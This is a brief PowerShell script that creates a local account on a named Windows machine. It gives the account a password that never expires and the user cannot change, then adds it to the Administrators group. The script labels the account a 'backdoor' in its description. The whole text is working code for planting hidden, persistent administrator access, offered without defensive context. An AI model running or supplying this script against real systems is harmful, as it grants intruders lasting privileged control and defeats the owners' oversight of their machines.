#Define variables
$Computer = "MBPWELPCIAD01"
$username = "User"
$password = "*************"
$fullname = "User Name"
$local_security_group = "Administrators"
$description = "Created as backdoor account, h@ckZ0rs!"

$users = $null
$comp = [ADSI]"WinNT://$computer"
 
#Create the account
$user = $comp.Create("User","$username")
$user.SetPassword("$password")
$user.Put("Description","$description")
$user.Put("Fullname","$fullname")
$user.SetInfo()
 
#Set password to never expire
#And set user cannot change password
$ADS_UF_DONT_EXPIRE_PASSWD = 0x10000
$ADS_UF_PASSWD_CANT_CHANGE = 0x40
$user.userflags = $ADS_UF_DONT_EXPIRE_PASSWD + $ADS_UF_PASSWD_CANT_CHANGE
$user.SetInfo()
 
#Add the account to the local admins group
$group = [ADSI]"WinNT://$computer/$local_security_group,group"
$group.add("WinNT://$computer/$username")